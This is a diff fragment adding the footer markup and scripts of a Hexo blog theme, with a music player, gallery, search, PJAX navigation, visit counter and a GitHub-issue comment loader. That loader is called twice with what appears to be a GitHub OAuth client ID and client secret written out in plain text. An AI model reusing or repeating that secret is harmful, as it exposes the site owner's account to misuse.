+        }var now = new Date();setInterval("createTime('2022/9/29 17:30:00')", 250,"");</script><br></span><div class="size-small"><span></span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="2364053447" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><script>$.getScript('/js/comment-issue-data.js',function(){loadIssueData('be835d1ee57b9ec974c1','5b2d7f351be105e013f11fa0ebde21cbea192152','UPON-2021','upon-2021.github.io',false);})</script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
+            elements: "a",//代表点击链接就更新
+            selectors: [  //代表要更新的节点
+                ".section",
+                "title"
+            ],
+            cache: true,
+            cacheBust:false
+        })
+
+        function loadBusuanzi(){
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
+        }
+
+        function loadMathJax() { //加载mathjax
+            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
+                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
+                var math = document.getElementsByClassName("entry-content")[0];
+                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
+            });
+        };
+
+        // 开始 PJAX 执行的函数
+        document.addEventListener('pjax:send', function () {
+        });
+        
+        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
+        document.addEventListener('pjax:complete', function () {
+            $(".section").css({opacity:1});
+            if(true){
+                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('be835d1ee57b9ec974c1','5b2d7f351be105e013f11fa0ebde21cbea192152','UPON-2021','upon-2021.github.io',false);});
+            }
+            if(false){
+                loadMathJax();
+            }
+            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
+            loadBackTop();
+            loadBusuanzi();
+            if(typeof loadBanner == 'function'){
+                loadBanner();
+            }
+        });</script></body></html>
